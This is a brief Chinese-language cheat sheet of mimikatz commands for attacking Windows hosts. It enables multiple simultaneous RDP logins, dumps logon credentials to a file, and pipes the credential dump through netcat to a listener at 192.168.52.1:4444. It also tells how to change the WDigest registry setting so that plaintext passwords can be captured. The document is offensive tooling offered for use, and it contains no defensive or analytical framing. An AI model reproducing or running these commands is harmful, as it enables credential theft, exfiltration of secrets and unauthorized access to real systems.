`允许多用户登录`
    
    mimikatz.exe,执行ts::multirdp允许多用户远程登录 重启失效
  
`mimikatz执行结果输出到文件`
    
    C:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt
`mimikatz执行结果输出到远程计算机(目标要上传nc)`

    local:E:\>nc -lvp 4444
    target:C:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | nc.exe -vv 192.168.52.1 4444 
    
    
`Tips:`

    2012抓明文需要HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest的"UseLogonCredential"设置为1，类型为DWORD 32才可以
    
   
    
    
